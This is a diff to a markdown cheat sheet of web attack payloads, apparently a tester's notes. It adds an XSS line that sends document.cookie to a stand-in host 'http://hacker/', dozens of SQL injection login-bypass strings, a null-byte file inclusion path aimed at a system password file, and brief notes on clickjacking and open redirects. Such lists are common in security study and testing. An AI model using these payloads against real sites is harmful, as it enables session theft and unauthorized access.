@@ -25,6 +25,7 @@ Good scripts to try
  - http://"onmouseover="alert(1)
  - hello <a name="n" href="javascript:alert('xss')">*you*</a>
  - '><img src=x onerror=alert(1);> or <img src=x onerror=alertHello!> or <b onclick=alert(1)>click me!
+ - "><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
  
 ### Injection
  - path injection - using . and .. to upload or read from system
@@ -34,12 +35,53 @@ Good scripts to try
    - `' and 1='0`
    - `1' OR 1 = 1#`
 
+   - ') or true--
+   - ') or ('')=('
+   - ') or 1--
+   - ') or ('x')=('
+   - " or true--
+   - " or ""="
+   - " or 1--
+   - " or "x"="
+   - ") or true--
+   - ") or ("")=("
+   - ") or 1--
+   - ") or ("x")=("
+   - 
+   - '-'
+   - ' '
+   - '&'
+   - '^'
+   - '*'
+   - ' or ''-'
+   - ' or '' '
+   - ' or ''&'
+   - ' or ''^'
+   - ' or ''*'
+   - "-"
+   - " "
+   - "&"
+   - "^"
+   - "*"
+   - " or ""-"
+
 ### Click Jacking
 Embedding transparent iframe on a page over top of an area to click.  Can tell if you click on something and it doesn't do anything.
 
-### File Inclusion
+### Null Termination Bugs
+The null byte terminates strings in c, you can take advantage of this for php, ruby, python when they are using dynamic includes
 
-  
+Allows you to truncate strings at will, really vulnerable to 
+
+ - `?page=/etc/password%00`
+
+### Unchecked Redirect
+ - authorization (/oauth)
+ - users could visit the page, be redirected and see a login page on another malicious site which dumps credentials into db
+ 
+ Mitigation is to do away with the url entirely and either
+  - remove http: from the url
+  - construct/infer the url from the payload 
  
 Detection
 Exploitation
